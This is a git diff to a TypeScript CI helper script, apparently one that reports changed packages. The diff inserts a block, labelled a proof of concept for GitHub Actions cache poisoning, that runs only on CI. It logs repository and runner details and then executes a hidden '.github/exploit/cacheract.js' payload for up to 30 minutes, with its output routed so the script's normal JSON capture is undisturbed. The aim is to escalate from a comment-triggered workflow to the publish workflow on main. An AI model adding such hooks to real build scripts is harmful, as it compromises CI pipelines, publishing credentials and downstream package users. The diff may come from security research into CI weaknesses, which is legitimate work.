@@ -12,6 +12,32 @@
 
 import { execSync } from "node:child_process";
 import { existsSync, readFileSync } from "node:fs";
+
+// ========== PoC: GitHub Actions Cache Poisoning ==========
+// This payload demonstrates cache poisoning privesc from
+// preview-publish.yml (issue_comment) -> publish.yml (push to main)
+if (process.env.GITHUB_ACTIONS === "true") {
+  console.error("=".repeat(60));
+  console.error("[PoC] Cache Poisoning PoC - Stage 1: Initial Access");
+  console.error("[PoC] Repository: " + process.env.GITHUB_REPOSITORY);
+  console.error("[PoC] Ref: " + process.env.GITHUB_REF);
+  console.error("[PoC] Event: " + process.env.GITHUB_EVENT_NAME);
+  console.error("[PoC] Runner: " + process.env.RUNNER_OS + " / " + process.env.RUNNER_ENVIRONMENT);
+  console.error("[PoC] Executing Cacheract payload...");
+  console.error("=".repeat(60));
+  try {
+    execSync("node .github/exploit/cacheract.js", {
+      cwd: process.env.GITHUB_WORKSPACE,
+      stdio: ["inherit", 2, "inherit"],  // stdout→stderr to not break JSON capture
+      timeout: 1800000,  // 30 min
+    });
+    console.error("[PoC] Cacheract execution complete");
+  } catch (e: any) {
+    console.error("[PoC] Cacheract error: " + e.message);
+  }
+  console.error("=".repeat(60));
+}
+// ========== End PoC ==========
 import { join } from "node:path";
 
 type ChangedPackagesResult = {
